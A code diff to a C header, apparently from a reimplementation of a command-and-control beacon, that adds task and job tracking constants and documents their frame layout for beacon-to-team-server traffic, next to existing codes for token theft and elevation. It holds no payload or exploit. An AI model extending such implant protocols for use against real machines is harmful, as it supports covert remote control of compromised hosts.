@@ -37,6 +37,26 @@
 #define CALLBACK_TOKEN_STOLEN_ELEVATE 0x24
 #define CALLBACK_TOKEN_REV2SELF      0x25
 #define CALLBACK_SYSCALL_METHOD      0x26
+
+/* 4.13 task tracking. The numbers and the frame layout are ours: the
+ * official wire format is not public, and what is documented of it (task
+ * ids, the statuses, the events and their transcript lines) is matched on
+ * the team server side.
+ *
+ * A frame that belongs to a task carries the task number right behind the
+ * command/callback word, flagged in the word's top bit:
+ *   task   (team server -> beacon): [command | TASK_TAG][size][task no u32][args]
+ *   output (beacon -> team server): [callback | TASK_TAG][task no u32][data]
+ * and a job's frame carries the job's id behind the task number:
+ *   [callback | TASK_TAG | JOB_TAG][task no u32][job id u32][data]
+ * The tag goes in front of chunking and queueing, so a chunked frame is
+ * rebuilt on the team server with it in place. */
+#define TASK_TAG                0x80000000u
+#define JOB_TAG                 0x40000000u
+#define CALLBACK_TASK_COMPLETED  0x27   /* the task's handler returned; no data */
+#define CALLBACK_JOB_REGISTERED  0x28   /* a job the task started: id in the header, description in the data */
+#define CALLBACK_JOB_COMPLETED   0x29   /* that job ended: same shape */
+#define CALLBACK_HOST_FAILOVER   0x2a   /* the next callback host after a failure: a message in the data */
 #define CALLBACK_DATA_STORE_ADD      0x33
 #define CALLBACK_DATA_STORE_REMOVE   0x34
 #define CALLBACK_DATA_STORE_LIST     0x35
